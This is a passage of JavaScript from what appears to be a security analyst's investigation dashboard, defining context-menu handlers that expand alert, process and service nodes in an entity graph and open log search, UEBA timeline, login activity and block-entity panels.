      collapseAllChildren(item.nodeId); // recurse
      if (item.gEl) item.gEl.remove();
      delete nodeRegistry[item.nodeId];
      delete ENTITIES[item.nodeId];
      delete ENTITY_DISPLAY[item.nodeId];
    });
    groups[cat] = [];
  }
  delete drillDownGroups[nodeId];
}

function ctxRelatedAlerts() {
  hideGraphCtx();
  const eid = ctxEntityId;
  const e = ENTITIES[eid];
  if (!e) return;
  const alertSec = e.sections.recentAlerts;
  if (!alertSec || (!alertSec.timeline?.length && !alertSec.viewAllData?.length)) {
    showToast('🔔', `No alert profiles found for ${e.modalTitle}`);
    return;
  }
  const entries = alertSec.viewAllData || alertSec.timeline;
  const result = branchChildNodes(eid, 'alert', entries, 'INVOLVED_IN', '🔔', {
    labelKey: 'Alert', malStroke: '#ef4444', normStroke: '#ef4444', malText: '#dc2626', normText: '#dc2626'
  });
  if (result === 'collapsed') {
    showToast('➖', `Alert profile nodes collapsed for ${e.modalTitle}`);
  } else {
    updateGraphSummary();
    showToast('🔔', `${entries.length} alert profile(s) branched from ${e.modalTitle}`);
  }
}

function ctxShowProcess() {
  hideGraphCtx();
  const eid = ctxEntityId;
  const e = ENTITIES[eid];
  if (!e) return;
  const procSec = e.sections.processes || e.sections.processesOnHost;
  if (!procSec || (!procSec.timeline?.length && !procSec.viewAllData?.length)) {
    showToast('⚙', `No processes found for ${e.modalTitle}`);
    return;
  }
  const entries = procSec.viewAllData || procSec.timeline;
  const result = branchChildNodes(eid, 'process', entries, 'EXECUTED', '⚙', {
    labelKey: 'Process Name', altLabelKey: 'Process', malStroke: '#ef4444', normStroke: '#16a34a', malText: '#dc2626', normText: '#16a34a'
  });
  if (result === 'collapsed') {
    showToast('➖', `Process nodes collapsed for ${e.modalTitle}`);
  } else {
    updateGraphSummary();
    showToast('⚙', `${entries.length} process(es) branched from ${e.modalTitle}`);
  }
}

function ctxShowServices() {
  hideGraphCtx();
  const eid = ctxEntityId;
  const e = ENTITIES[eid];
  if (!e) return;
  const svcSec = e.sections.serviceTriggered || e.sections.servicesOnHost;
  if (!svcSec || (!svcSec.timeline?.length && !svcSec.viewAllData?.length)) {
    showToast('🔧', `No services found for ${e.modalTitle}`);
    return;
  }
  const entries = svcSec.viewAllData || svcSec.timeline;
  const result = branchChildNodes(eid, 'service', entries, 'TRIGGERED', '🔧', {
    labelKey: 'Service Name', altLabelKey: 'Service', malStroke: '#ea580c', normStroke: '#0891b2', malText: '#ea580c', normText: '#0891b2'
  });
  if (result === 'collapsed') {
    showToast('➖', `Service nodes collapsed for ${e.modalTitle}`);
  } else {
    updateGraphSummary();
    showToast('🔧', `${entries.length} service(s) branched from ${e.modalTitle}`);
  }
}

function ctxEntityDetails() {
  hideGraphCtx();
  if (ctxEntityId) openEntitySlider(ctxEntityId);
}

function ctxSearchLogs() {
  hideGraphCtx();
  if (ctxEntityId) { openEntitySlider(ctxEntityId); showActionPanel('searchLogs', ctxEntityId); }
}

function ctxUebaTimeline() {
  hideGraphCtx();
  if (ctxEntityId) { openEntitySlider(ctxEntityId); showActionPanel('uebaTimeline', ctxEntityId); }
}

function ctxLoginActivity() {
  hideGraphCtx();
  if (!ctxEntityId) return;
  openEntitySlider(ctxEntityId);
  const e = ENTITIES[ctxEntityId];
  if (!e) return;
  // Determine which tab holds logonActivity for this entity type
  const tabMap = { user:'activity', device:'overview', ip:'logon' };
  const tabId = tabMap[e.type] || 'overview';
  setTimeout(() => navigateToTabSection(ctxEntityId, tabId, 'logonActivity'), 120);
}

function ctxBlockEntity() {
  hideGraphCtx();
  if (ctxEntityId) { openEntitySlider(ctxEntityId); showActionPanel('blockEntity', ctxEntityId); }
}

/* ── ACTION PANEL SYSTEM ─────────────────────────────────────── */
